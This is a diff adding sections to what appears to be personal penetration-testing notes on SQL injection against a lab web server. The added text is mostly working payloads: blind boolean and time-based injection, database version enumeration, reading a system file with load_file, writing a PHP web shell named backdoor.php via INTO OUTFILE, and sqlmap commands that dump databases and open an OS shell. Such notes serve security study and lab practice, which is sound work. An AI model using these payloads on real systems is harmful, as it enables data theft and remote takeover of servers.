@@ -113,3 +113,47 @@ Once we gain control we can use limit's to ensure we only get one record if nece
     `http://10.11.5.115/comment.php?id=738%20UNION%20SELECT%201,2,name,4,password,6%20FROM%20users`
 
 ##Blind SQL Injection
+Used at times you can't find errors
+
+1. We confirm injection by first appending a true statement and then a false statement and seeing if we get different results
+
+    ```
+    10.11.5.115/comment.php?id=738 AND 1=1;# 
+    10.11.5.115/comment.php?id=738 AND 1=2;#
+    ```
+
+2. It can also be confirmed using a sleep statement
+
+    ```
+    10.11.5.115/comment.php?id=738-sleep(5)
+    ```
+
+3. This can then be tied together to enumerate information out of the database
+
+    ```
+    10.11.5.115/comment.php?id=738 AND MID(@@version,1,1) = '5';#
+    10.11.5.115/comment.php?id=738-IF(MID(@@version,1,1) = '5',SLEEP(5),0)
+    ```
+
+##SQL Read/Write
+Using our union from before it's possible under certain circumstances to read files
+
+**Reading**
+```
+10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
+```
+
+**Writing**
+```
+10.11.5.115/comment.php?id=738 UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']); ?>",6 INTO OUTFILE 'c:/xampp/htdocs/backdoor.php'
+```
+
+##SQL Map
+SQL map can be used to identify/exploit SQLi vulns
+
+Uses
+```
+sqlmap -u http://10.11.5.115 --crawl=1
+sqlmap -u http://10.11.5.115/comment.php?id=738 --dbms=mysql --dump --threads=5
+sqlmap -u http://10.11.5.115/comment.php?id=738 --dbms=mysql --os-shell
+```
